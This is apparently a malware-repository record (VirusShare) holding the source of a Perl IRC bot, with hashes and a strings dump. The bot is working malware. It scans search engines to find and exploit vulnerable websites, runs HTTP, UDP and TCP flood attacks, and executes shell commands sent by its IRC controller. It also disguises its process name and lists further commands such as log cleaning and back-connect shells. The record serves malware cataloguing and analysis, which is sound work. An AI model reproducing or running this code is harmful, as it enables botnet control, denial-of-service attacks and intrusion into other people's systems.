\u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@mamalist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003Hotcox \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@hlist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003Altavista \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@altlist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003Search[dot]com \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@slist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003UoL \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@ulist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003FireBall \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@flist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n#\npush(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl \u0002\u001f\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u0002\u001f\u0003  Results: Total:\u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@tot).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites and Cleaned: \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@puliti).\"\u0002\u001f\u00034]\u0003\u0002\u001f for $dork \");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %100==0){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl \u0002\u001f\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u0002\u001f\u0003 Exploiting  \u0002\u001f\u00034[\u0003\u0002\u001f\".$contatore.\"\u0002\u001f\u00034]\u0003\u0002\u001f  of  \u0002\u001f\u00034[\u0003\u0002\u001f\".$uni. \"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl \u0002\u001f\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u0002\u001f\u0003 Finished for  $dork\");\n}\n### Print CMD and TEST CMD###\nmy $test=\"http://\".$sito.$bug.$id.\"?\";\nmy $print=\"http://\".$sito.$bug.$cmd.\"?\";\n### End of Print CMD and TEST CMD###\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\n$ua->timeout(4);\nmy $response=$ua->request($req);\nif ($response->is_success) {\nmy $re=$response->content;\nif($re =~ /Mic22/ && $re =~ /uid=/){\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl \u0002\u001f\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u0002\u001f\u0003  Safe Mode = OFF :. | Vuln:  $print \");\n}}\nelsif($re =~ /Mic22/)\n{\nmy $hs=geths($print); $hosts{$hs}++;\nif($hosts{$hs}==\"1\"){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl \u0002\u001f\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u0002\u001f\u0003  Safe Mode =  ON :. | Vuln:  $print  \");\n}}\n}}}\nexit;\n}}}\n######################\n#End of MultiSCANNER #\n######################\n######################\n#     HTTPFlood      #\n######################\n         if ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00039HTTP DDoS\u000312:.\u00034|\u000312 Attacking \u00034 \".$1.\" \u000312 on port 80 for \u00034 \".$2.\" \u000312 seconds .\");\n            my $itime = time;\n            my ($cur_time);\n            $cur_time = time - $itime;\n            while ($2>$cur_time){\n               $cur_time = time - $itime;\n               my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);\n               print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";\n               close($socket);\n            }\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00039HTTP DDoS\u000312:.\u00034|\u000312 Attacking done \u00034 \".$1.\".\");\n         }\n######################\n#  End of HTTPFlood  #\n######################\n######################\n#     UDPFlood       #\n######################\n         if ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034|\u000312.:\u00039UDP DDoS\u000312:.\u00034|\u000312 Attacking \u00034 \".$1.\" \u000312 with \u00034 \".$2.\" \u000312 Kb Packets for \u00034 \".$3.\" \u000312 seconds.\");\n            my ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");\n            $dtime = 1 if $dtime == 0;\n            my %bytes;\n            $bytes{igmp} = $2 * $pacotes{igmp};\n            $bytes{icmp} = $2 * $pacotes{icmp};\n            $bytes{o} = $2 * $pacotes{o};\n            $bytes{udp} = $2 * $pacotes{udp};\n            $bytes{tcp} = $2 * $pacotes{tcp};\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039UDP-DDos\u0002\u000312]\u000312 \u000312Results\u00034 \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" \u000312Kb in\u00034 \".$dtime.\" \u000312seconds to\u00034 \".$1.\".\");\n         }\n######################\n#  End of Udpflood   #\n######################\n         exit;\n      }\n   }\n\nsub ircase {\n   my ($kem, $printl, $case) = @_;\n   if ($case =~ /^join (.*)/) {\n      j(\"$1\");\n   }\n   if ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\n   if ($case =~ /^rejoin\\s+(.*)/) {\n      my $chan = $1;\n      if ($chan =~ /^(\\d+) (.*)/) {\n         for (my $ca = 1; $ca <= $1; $ca++ ) {\n            p(\"$2\");\n            j(\"$2\");\n         }\n      } else {\n         p(\"$chan\");\n         j(\"$chan\");\n      }\n   }\n\n   if ($case =~ /^op/) {\n      op(\"$printl\", \"$kem\") if $case eq \"op\";\n      my $oarg = substr($case, 3);\n      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n\n   if ($case =~ /^deop/) {\n      deop(\"$printl\", \"$kem\") if $case eq \"deop\";\n      my $oarg = substr($case, 5);\n      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n\n   if ($case =~ /^msg\\s+(\\S+) (.*)/) {\n      msg(\"$1\", \"$2\");\n   }\n\n   if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n         msg(\"$2\", \"$3\");\n      }\n   }\n\n   if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\n      ctcp(\"$1\", \"$2\");\n   }\n\n   if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n         ctcp(\"$2\", \"$3\");\n      }\n   }\n\n   if ($case =~ /^nick (.*)/) {\n      nick(\"$1\");\n   }\n\n   if ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {\n      conectar(\"$2\", \"$1\", 6667);\n   }\n\n   if ($case =~ /^raw (.*)/) {\n      sendraw(\"$1\");\n   }\n\n   if ($case =~ /^eval (.*)/) {\n      eval \"$1\";\n   }\n}\n\nsub get_html() {\n$test=$_[0];\n\n      $ip=$_[1];\n      $port=$_[2];\n\nmy $req=HTTP::Request->new(GET=>$test);\nmy $ua=LWP::UserAgent->new();\nif(defined($ip) && defined($port)) {\n      $ua->proxy(\"http\",\"http://$ip:$port/\");\n      $ua->agent(\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\");\n}\n$ua->timeout(1);\nmy $response=$ua->request($req);\nif ($response->is_success) {\n   $re=$response->content;\n}\nreturn $re;\n}\n\nsub addproc {\n\n   my $proc=$_[0];\n   my $dork=$_[1];\n   \n   open(FILE,\">>/var/tmp/pids\");\n   print FILE $proc.\" [\".$irc_servers{$IRC_cur_socket}{'nick'}.\"] $dork\\n\";\n   close(FILE);\n}\n\n\nsub delproc {\n\n   my $proc=$_[0];\n   open(FILE,\"/var/tmp/pids\");\n\n   while(<FILE>) {\n      $_ =~ /(\\d+)\\s+(.*)/;\n      $childs{$1}=$2;\n   }\n   close(FILE);\n   delete($childs{$proc});\n\n   open(FILE,\">/var/tmp/pids\");\n\n   for $klucz (keys %childs) {\n      print FILE $klucz.\" \".$childs{$klucz}.\"\\n\";\n   }\n}\n\nsub shell {\n   my $printl=$_[0];\n   my $comando=$_[1];\n   if ($comando =~ /cd (.*)/) {\n      chdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");\n      return;\n   } elsif ($pid = fork) {\n      waitpid($pid, 0);\n   } else {\n      if (fork) {\n         exit;\n      } else {\n         my @resp=`$comando 2>&1 3>&1`;\n         my $c=0;\n         foreach my $linha (@resp) {\n            $c++;\n            chop $linha;\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n            if ($c == \"$linas_max\") {\n               $c=0;\n               sleep $sleep;\n            }\n         }\n         exit;\n      }\n   }\n}\n\nsub tcpflooder {\n   my $itime = time;\n   my ($cur_time);\n   my ($ia,$pa,$proto,$j,$l,$t);\n   $ia=inet_aton($_[0]);\n   $pa=sockaddr_in($_[1],$ia);\n   $ftime=$_[2];\n   $proto=getprotobyname('tcp');\n   $j=0;$l=0;\n   $cur_time = time - $itime;\n   while ($l<1000){\n      $cur_time = time - $itime;\n      last if $cur_time >= $ftime;\n      $t=\"SOCK$l\";\n      socket($t,PF_INET,SOCK_STREAM,$proto);\n      connect($t,$pa)||$j--;\n      $j++;\n      $l++;\n   }\n   $l=0;\n   while ($l<1000){\n      $cur_time = time - $itime;\n      last if $cur_time >= $ftime;\n      $t=\"SOCK$l\";\n      shutdown($t,2);\n      $l++;\n   }\n}\n\nsub udpflooder {\n   my $iaddr = inet_aton($_[0]);\n   my $msg = 'A' x $_[1];\n   my $ftime = $_[2];\n   my $cp = 0;\n   my (%pacotes);\n   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\n   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\n   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\n   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\n   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\n   return(undef) if $cp == 4;\n   my $itime = time;\n   my ($cur_time);\n   while ( 1 ) {\n      for (my $porta = 1; $porta <= 65000; $porta++) {\n         $cur_time = time - $itime;\n         last if $cur_time >= $ftime;\n         send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;\n         send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;\n         send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;\n         send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;\n         for (my $pc = 3; $pc <= 255;$pc++) {\n            next if $pc == 6;\n            $cur_time = time - $itime;\n            last if $cur_time >= $ftime;\n            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\n            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;\n         }\n      }\n      last if $cur_time >= $ftime;\n   }\n   return($cur_time, %pacotes);\n}\n\nsub ctcp {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\n\nsub msg {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :$_[1]\");\n}\n\nsub notice {\n   return unless $#_ == 1;\n   sendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +o $_[1]\");\n}\n\nsub deop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -o $_[1]\");\n}\n\nsub j {\n   &join(@_);\n}\n\nsub join {\n   return unless $#_ == 0;\n   sendraw(\"JOIN $_[0]\");\n}\n\nsub p {\n   part(@_);\n}\n\nsub part {\n   sendraw(\"PART $_[0]\");\n}\n\nsub nick {\n   return unless $#_ == 0;\n   sendraw(\"NICK $_[0]\");\n}\n\nsub quit {\n   sendraw(\"QUIT :$_[0]\");\n}\n\nsub ubah {\nmy $ganti  = $_[0];\n   $ganti  =~ s/\\./-/g;\n   $ganti  =~ s/www.//g;\n   return $ganti;\n}\n\nsub fetch(){\n   my $rnd=(int(rand(9999)));\n   my $n= 80;\n   if ($rnd<5000) {\n      $n<<=1;\n   }\n   my $s= (int(rand(10)) * $n);\n   my @dominios = (\"removed-them-all\");\n   my @str;\n   foreach $dom  (@dominios){\n      push (@str,\"@gstring\");\n   }\n   my $query=\"www.google.com/search?q=\";\n   $query.=$str[(rand(scalar(@str)))];\n   $query.=\"&num=$n&start=$s\";\n   my @lst=();\n   sendraw(\"privmsg #debug :DEBUG only test googling: \".$query.\"\");\n   my $page = http_query($query);\n   while ($page =~  m/<a href=\\\"?http:\\/\\/([^>\\\"]+)\\\"? class=l>/g){\n      if ($1 !~ m/google|cache|translate/){\n         push (@lst,$1);\n      }\n   }\n   return (@lst);\n\nsub yahoo(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=100){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub msn(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=10){\nmy $msn=(\"http://search.msn.de/results.aspx?q=\".key($key).\"&first=\".$b.\"&FORM=PORE\");\nmy $Res=query($msn);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif($1 !~ /msn|live/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\nsub lycos(){\nmy $inizio=0;\nmy $pagine=20;\nmy $key=$_[0];\nmy $av=0;\nmy @lst;\nwhile($inizio <= $pagine){\nmy $lycos=\"http://search.lycos.com/?query=\".key($key).\"&page=$av\";\nmy $Res=query($lycos);\nwhile ($Res=~ m/<span class=\\\"?grnLnk small\\\"?>http:\\/\\/(.+?)\\//g ){\nmy $k=\"$1\";\nmy @grep=links($k);\npush(@lst,@grep);\n}\n$inizio++;\n$av++;\n}\nreturn @lst;\n}\n\n#####\nsub aol(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=100;$b++){\nmy $AoL=(\"http://search.aol.com/aol/search?query=\".key($key).\"&page=\".$b.\"&nt=null&ie=UTF-8\");\nmy $Res=query($AoL);\nwhile($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n#####\nsub ask(){\nmy @lst;\nmy $key=$_[0];\nmy $i=0;\nmy $pg=0;\nfor($i=0; $i<=1000; $i+=10)\n{\nmy $Ask=(\"http://it.ask.com/web?q=\".key($key).\"&o=312&l=dir&qsrc=0&page=\".$i.\"&dm=all\");\nmy $Res=query($Ask);\nwhile($Res=~m/<a id=\\\"(.*?)\\\" class=\\\"(.*?)\\\" href=\\\"(.+?)\\onmousedown/g){\nmy $k=$3;\n$k=~s/[\\\"\\ ]//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n#####\nsub alltheweb()\n{\nmy @lst;\nmy $key=$_[0];\nmy $i=0;\nmy $pg=0;\nfor($i=0; $i<=1000; $i+=100)\n{\nmy $all=(\"http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=\".key($key).\"&o=\".$i);\nmy $Res=query($all);\nwhile($Res =~ m/<span class=\\\"?resURL\\\"?>http:\\/\\/(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/ //g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub google(){\nmy @lst;\nmy $key = $_[0];\nfor($b=0;$b<=100;$b+=100){\nmy $Go=(\"http://www.google.it/search?hl=it&q=\".key($key).\"&num=100&filter=0&start=\".$b);\nmy $Res=query($Go);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif ($1 !~ /google/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\n#####\n# SUBS SEARCH\n#####\nsub search(){\nmy @lst;\nmy $key = $_[0];\nfor($b=0;$b<=1000;$b+=100){\nmy $ser=(\"http://www.search.com/search?q=\".key($key).\"\".$b);\nmy $Res=query($ser);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif ($1 !~ /msn|live|google|yahoo/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\n#####\n# SUBS FireBall\n#####\nsub fireball(){\nmy $key=$_[0];\nmy $inicio=1;\nmy $pagina=200;\nmy @lst;\nmy $av=0;\nwhile($inicio <= $pagina){\nmy $fireball=\"http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=\".key($key).\"&cat=fb_loc&idx=all&enc=utf-8\";\nmy $Res=query($fireball);\nwhile ($Res=~ m/<a href=\\\"?http:\\/\\/(.+?)\\//g ){\nif ($1 !~ /msn|live|google|yahoo/){\nmy $k=\"$1/\";\nmy @grep=links($k);\npush(@lst,@grep);\n}}\n$av=$av+10;\n$inicio++;\n}\nreturn @lst;\n}\n#####\n# SUBS UOL\n#####\nsub uol(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=10){\nmy $UoL=(\"http://busca.uol.com.br/www/index.html?q=\".key($key).\"&start=\".$i);\nmy $Res=query($UoL);\nwhile($Res =~ m/<a href=\\\"http:\\/\\/([^>\\\"]*)/g){\nmy $k=$1;\nif($k!~/busca|uol|yahoo/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\n#####\n# Altavista\n#####\nsub altavista(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=10){\nmy $AlT=(\"http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=\".key($key).\"&stq=\".$b);\nmy $Res=query($AlT);\nwhile($Res=~m/<span class=ngrn>(.+?)\\//g){\nif($1 !~ /altavista/){\nmy $k=$1;\n$k=~s/<//g;\n$k=~s/ //g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\nsub altavistade(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=10){\nmy $AlT=(\"http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=\".key($key).\"&stq=\".$b);\nmy $Res=query($AlT);\nwhile($Res=~m/<span class=ngrn>(.+?)\\//g){\nif($1 !~ /altavista/){\nmy $k=$1;\n$k=~s/<//g;\n$k=~s/ //g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\nsub altavistaus(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=10){\nmy $AlT=(\"http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=\".key($key).\"&stq=\".$b);\nmy $Res=query($AlT);\nwhile($Res=~m/<span class=ngrn>(.+?)\\//g){\nif($1 !~ /altavista/){\nmy $k=$1;\n$k=~s/<//g;\n$k=~s/ //g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\n#####\n# Hotcox\n#####\nsub hotcox(){\nmy @lst;\nmy $key = $_[0];\nfor($b=0;$b<=1000;$b+=100){\nmy $hot=(\"http://search.hotcox.de/cgi-bin/pursuit?pag=$av&query=\".key($key).\"&cat=hb_loc&enc=utf-8\".$b);\nmy $Res=query($hot);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif ($1 !~ /msn|live|google|yahoo/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\n\n#####\n# Mamma\n#####\nsub mamma(){\nmy @lst;\nmy $key = $_[0];\nfor($b=0;$b<=1000;$b+=100){\nmy $mam=(\"http://www.mamma.com/Mamma?utfout=$av&qtype=0&query=\".key($key).\"\".$b);\nmy $Res=query($mam);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif ($1 !~ /msn|live|google|yahoo/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\n#####\n# Mozcox\n#####\nsub mozcox()\n{\nmy @lst;\nmy $key=$_[0];\nmy $i=0;\nmy $pg=0;\nfor($i=0; $i<=100; $i+=1){\nmy $mozcox=(\"http://www.mozcox.fr/search?q=\".key($key).\"&st=int&page=\".$i);\nmy $Res=query($mozcox);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/(.+?)\\\" target/g){\nmy $k=$1;\n$k=~s/ //g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub links()\n{\nmy @l;\nmy $link=$_[0];\nmy $host=$_[0];\nmy $hdir=$_[0];\n$hdir=~s/(.*)\\/[^\\/]*$/\\1/;\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$host.=\"/\";\n$link.=\"/\";\n$hdir.=\"/\";\n$host=~s/\\/\\//\\//g;\n$hdir=~s/\\/\\//\\//g;\n$link=~s/\\/\\//\\//g;\npush(@l,$link,$host,$hdir);\nreturn @l;\n}\n\nsub geths(){\nmy $host=$_[0];\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\nreturn $host;\n}\n\nsub key(){\nmy $chiave=$_[0];\n$chiave =~ s/ /\\+/g;\n$chiave =~ s/:/\\%3A/g;\n$chiave =~ s/\\//\\%2F/g;\n$chiave =~ s/&/\\%26/g;\n$chiave =~ s/\\\"/\\%22/g;\n$chiave =~ s/,/\\%2C/g;\n$chiave =~ s/\\\\/\\%5C/g;\nreturn $chiave;\n}\n\nsub query($){\nmy $url=$_[0];\n$url=~s/http:\\/\\///;\nmy $host=$url;\nmy $query=$url;\nmy $page=\"\";\n$host=~s/href=\\\"?http:\\/\\///;\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$query=~s/$host//;\nif ($query eq \"\") {$query=\"/\";};\neval {\nmy $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\nprint $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\nmy @r = <$sock>;\n$page=\"@r\";\nclose($sock);\n};\nreturn $page;\n}\n\nsub unici{\nmy @unici = ();\nmy %visti = ();\nforeach my $elemento ( @_ )\n{\nnext if $visti{ $elemento }++;\npush @unici, $elemento;\n}   \nreturn @unici;\n}\n\nsub http_query($){\nmy ($url) = @_;\nmy $host=$url;\nmy $query=$url;\nmy $page=\"\";\n$host =~ s/href=\\\"?http:\\/\\///;\n$host =~ s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$query =~s/$host//;\nif ($query eq \"\") {$query=\"/\";};\neval {\nlocal $SIG{ALRM} = sub { die \"1\";};\nalarm 10;\nmy $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\nprint $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\nmy @r = <$sock>;\n$page=\"@r\";\nalarm 0;\nclose($sock);\n};\nreturn $page;\n}}"
    },
    "filename": "VirusShare_315215987737297cf706b1d3b1e0ecf3",
    "filesize": 64330,
    "filetype": "a /usr/bin/perl script executable (binary data)",
    "hashes": {
        "md5": "315215987737297cf706b1d3b1e0ecf3",
        "sha1": "b99a7019f7399de2accb1df276eea5ce2a8814b0",
        "sha256": "8737c4ec87c8832dc600bf1cef1035b99abfb72a517625d7b884bd1dbc3dfec4"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "################",
            "# Original Design By Pitbul ",
            "#-[B0T Commands List]-",
            "#-----[Hacking Based]-----",
            "# !cox @multiscan <vuln> <dork>",
            "# !cox @socks5",
            "# !cox @sql2 <vuln> <dork> <col>",
            "# !cox @portscan <ip>",
            "# !cox @logcleaner",
            "# !cox @sendmail <subject> <sender> <recipient> <message>",
            "# !cox @system",
            "# !cox @cleartmp",
            "# !cox @rootable",
            "# !cox @nmap <ip> <beginport> <endport>",
            "# !cox @back <ip><port>  ",
            "# !cox @linuxhelp",
            "# !cox @cd tmp:. | for example",
            "#-----[Advisory-New Based]-----",
            "# !cox @packetstorm",
            "# !cox @milw0rm",
            "#-----[DDos Based]-----",
            "# !cox @udpflood <host> <packet size> <time>",
            "# !cox @tcpflood <host> <port> <packet size> <time>",
            "# !cox @httpflood <host> <time>",
            "# !cox @sqlflood <host> <time>",
            "#-----[IRC Based]-----",
            "# !cox @killme  ",
            "# !cox @join #channel",
            "# !cox @part #channel",
            "# !cox @reset",
            "# !cox @voice <who>",
            "# !cox @owner <who>",
            "# !cox @deowner <who>",
            "# !cox @dcoxice <who>",
            "# !cox @halfop <who>",
            "# !cox @dehalfop <who>",
            "# !cox @op <who>",
            "# !cox @deop <who>",
            "#-----[Flooding Based]-----",
            "# !cox @msgflood <who>",
            "# !cox @dccflood <who>",
            "# !cox @ctcpflood <who>",
            "# !cox @noticeflood <who>",
            "# !cox @channelflood",
            "# !cox @maxiflood <who>",
            "####################################",
            "use HTTP::Request;",
            "use LWP::UserAgent;",
            "my $processo = '/usr/sbin/httpd';",
            "my $linas_max='10';",
            "my $sleep='5';",
            "my $cmd=\"\";",
            "my $id=\"\";",
            "############################################",
            "my @adms=(\"arisNdEso\");",
            "my $runner=$adms [rand scalar @adms];",
            "my @canais=(\"#cafe\");",
            "chop (my $nick = `hostname`);",
            "$nick = &ubah($nick);",
            "my $ircname = $nick;",
            "print $nick;",
            "chop (my $realname = `uname -asro`);",
            "#IRC name and Realname ",
            "$servidor='irc.javairc.org' unless $servidor;",
            "my $porta='6667';",
            "############################################",
            "$SIG{'INT'} = 'IGNORE';",
            "$SIG{'HUP'} = 'IGNORE';",
            "$SIG{'TERM'} = 'IGNORE';",
            "$SIG{'CHLD'} = 'IGNORE';",
            "$SIG{'PS'} = 'IGNORE';",
            "use IO::Socket;",
            "use Socket;",
            "use IO::Select;",
            "chdir(\"/\");",
            "#Connect",
            "$servidor=\"$ARGV[0]\" if $ARGV[0];",
            "$0=\"$processo\".\"\\0\"x16;;",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Masalah fork: $!\" unless defined($pid);",
            "our %irc_servers;",
            "our %DCC;",
            "my $dcc_sel = new IO::Select->new();",
            "$sel_cliente = IO::Select->new();",
            "sub sendraw {",
            "   if ($#_ == '1') {",
            "      my $socket = $_[0];",
            "      print $socket \"$_[1]\\n\";",
            "   } else {",
            "      print $IRC_cur_socket \"$_[0]\\n\";",
            "   }",
            "sub conectar {",
            "   my $meunick = $_[0];",
            "   my $servidor_con = $_[1];",
            "   my $porta_con = $_[2];",
            "   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\",",
            "   PeerPort=>$porta_con) or return(1);",
            "   if (defined($IRC_socket)) {",
            "      $IRC_cur_socket = $IRC_socket;",
            "      $IRC_socket->autoflush(1);",
            "      $sel_cliente->add($IRC_socket);",
            "      $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";",
            "      $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";",
            "      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;",
            "      nick(\"$meunick\");",
            "      sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");",
            "      sleep 1;",
            "   }",
            "my $line_temp;",
            "while( 1 ) {",
            "   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }",
